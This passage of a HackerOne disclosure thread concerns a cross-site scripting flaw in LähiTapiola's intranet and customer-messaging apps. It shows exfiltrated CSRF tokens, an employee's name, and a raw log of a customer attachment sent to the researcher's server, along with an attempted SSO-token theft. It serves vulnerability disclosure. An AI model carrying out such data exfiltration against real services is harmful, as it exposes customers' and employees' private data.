+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/119/555/7a19eb9de10686815bc98fdcf24df32abc2b7de8/tasku-poc.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224311Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7e117f9d4c03ecf9bc2df430cbb8696ec0e8d7317f38df102e1aae150ac43537", 
+                    "type": "image/png", 
+                    "id": 119555, 
+                    "filename": "tasku-poc.png"
+                }, 
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/119/556/94835e151612a8b6489e03bf4713194542199549/data-extractor-svg-poc.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224311Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=905b7f27834239a9e8f796baf7efee74c14d077879616b3d8f9da8cc46fe27e7", 
+                    "type": "text/html", 
+                    "id": 119556, 
+                    "filename": "data-extractor-svg-poc.txt"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2016-09-13T10:59:37.731Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-09-13T11:11:31.456Z", 
+            "actor": {
+                "username": "putsi", 
+                "url": "/putsi", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "After further research, it seems to be pretty easy for an attacker to extract data by using this vulnerability. In the attached image, index-page was loaded from the intranet site **Tasku** (tasku.tapiola.fi and http://tasku/) and from **Verka-application** by using the attached text-file as XSS-payload. The attached image is missing CSS-styles so that might make it look different than the actual intranet-page.\n\nI could also extract CSRF-tokens so it would allow me to send malicious POST-requests to Tasku- and Verka-functionalities.\n```\nPage title:\n<title>Verkkoviestien k\u00e4sittely  v6.5.0</title>\n\nLahitapiola employee who accessed the XSS:\n<span id=\"subviewKasittelija:KasittelijanNimiTxt\" class=\"text\">LAURA HANNINEN</span><table id=\"subviewKasittelija:tapiolaBox\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"margin: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; margin-top: 0px; padding: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; padding-top: 0px\">\n\nSome interesting page that could be extracted:\n<a aref=\"http://tasku/Tapiolalaisen_kasikirja/Ohjeistus/Kaytannon_ohjeet/Tietojarjestelmien+kayttoohjeita/Verka/\" onclick=\"return popitup('http://tasku/Tapiolalaisen_kasikirja/Ohjeistus/Kaytannon_ohjeet/Tietojarjestelmien+kayttoohjeita/Verka/')\">Ohje</a>\n\nCSRF-tokens of the L\u00e4hitapiola employee:\n<input type=\"hidden\" name=\"javax.faces.ViewState\" id=\"javax.faces.ViewState\" value=\"j_id106:j_id107\" />\n<input type=\"hidden\" name=\"fi.tapiola.faces.token\" value=\"D5BC5BE4D290A710286E43CF40B6D2ED\" /></form>\n```\n\n**Please note:** I did not extract any customer data, just the index-page. However I am fairly certain that customer data could also be easily extracted.", 
+            "markdown_message": "<p>After further research, it seems to be pretty easy for an attacker to extract data by using this vulnerability. In the attached image, index-page was loaded from the intranet site <strong>Tasku</strong> (tasku.tapiola.fi and <a title=\"http://tasku/\" href=\"/redirect?signature=51e38836b4829728deb8bc43d4ddc150cf55e9c1&amp;url=http%3A%2F%2Ftasku%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://tasku/</span><i class=\"icon-external-link\"></i></a>) and from <strong>Verka-application</strong> by using the attached text-file as XSS-payload. The attached image is missing CSS-styles so that might make it look different than the actual intranet-page.</p>\n\n<p>I could also extract CSRF-tokens so it would allow me to send malicious POST-requests to Tasku- and Verka-functionalities.</p>\n<pre class=\"highlight plaintext\"><code>Page title:\n&lt;title&gt;Verkkoviestien k\u00e4sittely  v6.5.0&lt;/title&gt;\n\nLahitapiola employee who accessed the XSS:\n&lt;span id=&quot;subviewKasittelija:KasittelijanNimiTxt&quot; class=&quot;text&quot;&gt;LAURA HANNINEN&lt;/span&gt;&lt;table id=&quot;subviewKasittelija:tapiolaBox&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; style=&quot;margin: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; margin-top: 0px; padding: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; padding-top: 0px&quot;&gt;\n\nSome interesting page that could be extracted:\n&lt;a aref=&quot;http://tasku/Tapiolalaisen_kasikirja/Ohjeistus/Kaytannon_ohjeet/Tietojarjestelmien+kayttoohjeita/Verka/&quot; onclick=&quot;return popitup(&#39;http://tasku/Tapiolalaisen_kasikirja/Ohjeistus/Kaytannon_ohjeet/Tietojarjestelmien+kayttoohjeita/Verka/&#39;)&quot;&gt;Ohje&lt;/a&gt;\n\nCSRF-tokens of the L\u00e4hitapiola employee:\n&lt;input type=&quot;hidden&quot; name=&quot;javax.faces.ViewState&quot; id=&quot;javax.faces.ViewState&quot; value=&quot;j_id106:j_id107&quot; /&gt;\n&lt;input type=&quot;hidden&quot; name=&quot;fi.tapiola.faces.token&quot; value=&quot;D5BC5BE4D290A710286E43CF40B6D2ED&quot; /&gt;&lt;/form&gt;\n</code></pre>\n<p><strong>Please note:</strong> I did not extract any customer data, just the index-page. However I am fairly certain that customer data could also be easily extracted.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1190588, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-09-13T11:17:29.314Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-09-13T11:17:29.314Z", 
+            "actor": {
+                "username": "putsi", 
+                "url": "/putsi", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "I won't touch the vulnerability anymore as these should be more than enough for a proof-of-concept. If you wish to get more details, please don't hesitate to ask.", 
+            "markdown_message": "<p>I won&#39;t touch the vulnerability anymore as these should be more than enough for a proof-of-concept. If you wish to get more details, please don&#39;t hesitate to ask.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1190684, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-09-13T14:37:56.873Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-09-13T14:37:56.873Z", 
+            "actor": {
+                "username": "localtapiola-thomas", 
+                "url": "/localtapiola-thomas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "Thanks for all the effort, we are looking into this at the moment.", 
+            "markdown_message": "<p>Thanks for all the effort, we are looking into this at the moment.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1191086, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-09-28T15:29:15.751Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-09-28T15:29:15.751Z", 
+            "actor": {
+                "username": "putsi", 
+                "url": "/putsi", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "Any updates on this?\nAlso, do you mind if I try to exploit this again? My friend gave me permission to use his account as a target so I would like to see if I can actually extract some data.", 
+            "markdown_message": "<p>Any updates on this?<br>\nAlso, do you mind if I try to exploit this again? My friend gave me permission to use his account as a target so I would like to see if I can actually extract some data.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1221440, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-09-29T08:13:15.943Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-09-29T08:13:15.943Z", 
+            "actor": {
+                "username": "localtapiola-thomas", 
+                "url": "/localtapiola-thomas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "Let me check for you if that is OK.", 
+            "markdown_message": "<p>Let me check for you if that is OK.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1223146, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-06T13:39:03.449Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-06T13:39:03.449Z", 
+            "actor": {
+                "username": "putsi", 
+                "url": "/putsi", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Critical (9.0)", 
+                "old_severity": null
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 1235516, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-12T15:52:30.593Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-12T15:53:05.971Z", 
+            "actor": {
+                "username": "localtapiola-thomas", 
+                "url": "/localtapiola-thomas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "Sorry for getting back this late. The answer is: we cannot endorse you using other people's accounts as targets. Co-investigating into this issue as a team is a different thing of course.", 
+            "markdown_message": "<p>Sorry for getting back this late. The answer is: we cannot endorse you using other people&#39;s accounts as targets. Co-investigating into this issue as a team is a different thing of course.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1244179, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-18T20:45:30.434Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-18T20:45:41.785Z", 
+            "actor": {
+                "username": "localtapiola-thomas", 
+                "url": "/localtapiola-thomas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": ".", 
+            "markdown_message": "<p>.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1254200, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/129/312/757e0a8a3e2623fb19b25e9e2f6b3dc8aecad87b/payload.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224311Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=86b57e96bc24da1532336ba8db9327a19f62a298d053d905820f361ff3639bb7", 
+                    "type": "text/html", 
+                    "id": 129312, 
+                    "filename": "payload.txt"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2016-10-21T10:01:31.031Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-22T13:22:13.527Z", 
+            "actor": {
+                "username": "putsi", 
+                "url": "/putsi", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "Hi, we did some co-investigating as team with my friend and it seems that by using the attached payload.txt, it is possible to extract attachments and messages of other customers from the website. The request below is sent by the L\u00e4hiTapiola employee's browser to my server and contains content of an attachment that is from different account than the one that sent the malicious payload.\n\n```\n------------ NEW REQUEST -----------------\n\nIP ADDRESS: 193.209.71.2\n\nCache-Control: no-cache\nConnection: Keep-Alive\nContent-Length: 67\nHost: www.rot.fi\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; MS-RTC LM 8)\nAccept-Encoding: gzip, deflate\nReferer: https://\u2588\u2588\u2588.tapiola.fi/a2/VerkaFileLoaderWeb/rest/files/93b50b2e-c60c-4052-89bc-101b9c9b1bd9\nAccept-Language: fi-FI\nAccept: */*\n\n\nT\u00e4m\u00e4 viesti on l\u00e4hetetty Pertti Puttosen k\u00e4ytt\u00e4j\u00e4tunnuksilla.\n```\n\n\nI noticed that the URL `https://verkkopalvelu.tapiola.fi/FIM/sps/ELOSAMLV2OAV/saml20/logininitial?RequestBinding=HTTPPost&ResponseBinding=HTTPPost&NameIdFormat=persistent&IsPassive=true&ForceAuthn=true&RequestedAuthnContextComparison=minimum&PartnerId=https://ext.elo.fi/a1_fam/ui_igm`\nreturns HTTP-page with SAML-message that contains Single Sign-On-tokens and user's full name and username and social security number. I'll try next if I can access that with the employee's browser session through the exploit. Hopefully it is not possible to access that data as it would possibly result in me being able to use the employee's single sign on token to sign in to L\u00e4hitapiola services and to 3rd party services that use L\u00e4hitapiola Single sign-on functionality.", 
+            "markdown_message": "<p>Hi, we did some co-investigating as team with my friend and it seems that by using the attached payload.txt, it is possible to extract attachments and messages of other customers from the website. The request below is sent by the L\u00e4hiTapiola employee&#39;s browser to my server and contains content of an attachment that is from different account than the one that sent the malicious payload.</p>\n<pre class=\"highlight plaintext\"><code>------------ NEW REQUEST -----------------\n\nIP ADDRESS: 193.209.71.2\n\nCache-Control: no-cache\nConnection: Keep-Alive\nContent-Length: 67\nHost: www.rot.fi\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; MS-RTC LM 8)\nAccept-Encoding: gzip, deflate\nReferer: https://\u2588\u2588\u2588.tapiola.fi/a2/VerkaFileLoaderWeb/rest/files/93b50b2e-c60c-4052-89bc-101b9c9b1bd9\nAccept-Language: fi-FI\nAccept: */*\n\n\nT\u00e4m\u00e4 viesti on l\u00e4hetetty Pertti Puttosen k\u00e4ytt\u00e4j\u00e4tunnuksilla.\n</code></pre>\n<p>I noticed that the URL <code>https://verkkopalvelu.tapiola.fi/FIM/sps/ELOSAMLV2OAV/saml20/logininitial?RequestBinding=HTTPPost&amp;ResponseBinding=HTTPPost&amp;NameIdFormat=persistent&amp;IsPassive=true&amp;ForceAuthn=true&amp;RequestedAuthnContextComparison=minimum&amp;PartnerId=https://ext.elo.fi/a1_fam/ui_igm</code><br>\nreturns HTTP-page with SAML-message that contains Single Sign-On-tokens and user&#39;s full name and username and social security number. I&#39;ll try next if I can access that with the employee&#39;s browser session through the exploit. Hopefully it is not possible to access that data as it would possibly result in me being able to use the employee&#39;s single sign on token to sign in to L\u00e4hitapiola services and to 3rd party services that use L\u00e4hitapiola Single sign-on functionality.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1259570, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-21T10:15:23.985Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-21T10:15:23.985Z", 
+            "actor": {
+                "username": "putsi", 
+                "url": "/putsi", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "Please indicate if you wish that I'll stop investigating on this issue!", 
+            "markdown_message": "<p>Please indicate if you wish that I&#39;ll stop investigating on this issue!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1259602, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-21T10:48:36.622Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-21T10:50:31.292Z", 
+            "actor": {
+                "username": "localtapiola-thomas", 
+                "url": "/localtapiola-thomas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "Ok, great stuff (not literally). Thanks for the update, we do appreciate the in-depth effort and this additional information. We are already fixing this issue, but I will make sure they get the information you provided to assess if this is something that will be covered by the fix.", 
+            "markdown_message": "<p>Ok, great stuff (not literally). Thanks for the update, we do appreciate the in-depth effort and this additional information. We are already fixing this issue, but I will make sure they get the information you provided to assess if this is something that will be covered by the fix.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1259690, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/130/459/829321d63f4668fe1145659dab1dfc755f64e320/result.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224311Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ecd13bc02664ae0faceba7baeea973119e0f9806e769d90e9ca49ece02166947", 
+                    "type": "image/png", 
+                    "id": 130459, 
+                    "filename": "result.png"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2016-10-27T08:28:09.615Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-27T08:37:38.545Z", 
+            "actor": {
+                "username": "putsi", 
+                "url": "/putsi", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "#### Post exploitation status update:\nI tried the SSO-token exfiltration and it didn't succeed due to WebSEAL Access Manager (see the attached picture). \n\nExploiting the vulnerability with [BeEF](http://beefproject.com/) would be interesting, however I am pretty certain that LocalTapiola won't allow that due to privacy/confidentiality/legal reasons.", 
+            "markdown_message": "<h4 id=\"post-exploitation-status-update\">Post exploitation status update:</h4>\n\n<p>I tried the SSO-token exfiltration and it didn&#39;t succeed due to WebSEAL Access Manager (see the attached picture). </p>\n\n<p>Exploiting the vulnerability with <a href=\"/redirect?signature=3d4fca8dd9cb21b697e85f0265dff43b3aa3be16&amp;url=http%3A%2F%2Fbeefproject.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>BeEF</span><i class=\"icon-external-link\"></i></a> would be interesting, however I am pretty certain that LocalTapiola won&#39;t allow that due to privacy/confidentiality/legal reasons.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1270457, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-11-14T08:25:20.618Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-11-14T08:25:20.618Z", 
+            "actor": {
+                "username": "localtapiola-thomas", 
+                "url": "/localtapiola-thomas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "Hi, it seems like a fix for this is on it's way. Patience.", 
+            "markdown_message": "<p>Hi, it seems like a fix for this is on it&#39;s way. Patience.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1297556, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-11-14T08:32:56.122Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-11-14T08:32:56.122Z", 
+            "actor": {
+                "username": "putsi", 
+                "url": "/putsi", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "Okay, I've stopped on investigating this but I'll re-test after the fix is deployed.", 
+            "markdown_message": "<p>Okay, I&#39;ve stopped on investigating this but I&#39;ll re-test after the fix is deployed.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1297574, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-01-27T04:48:17.481Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-27T04:48:17.481Z", 
+            "actor": {
+                "username": "putsi", 
+                "url": "/putsi", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "Hi, any updates on this one?", 
+            "markdown_message": "<p>Hi, any updates on this one?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1447423, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-01-27T08:19:36.625Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-27T08:19:36.625Z", 
+            "actor": {
+                "username": "localtapiola-thomas", 
+                "url": "/localtapiola-thomas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "Hi, there was a fix initially planned for this week - now I haven't heard anything at all regarding that update. If you care to do a quick retest, then we can verify the situation.", 
+            "markdown_message": "<p>Hi, there was a fix initially planned for this week - now I haven&#39;t heard anything at all regarding that update. If you care to do a quick retest, then we can verify the situation.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1447549, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
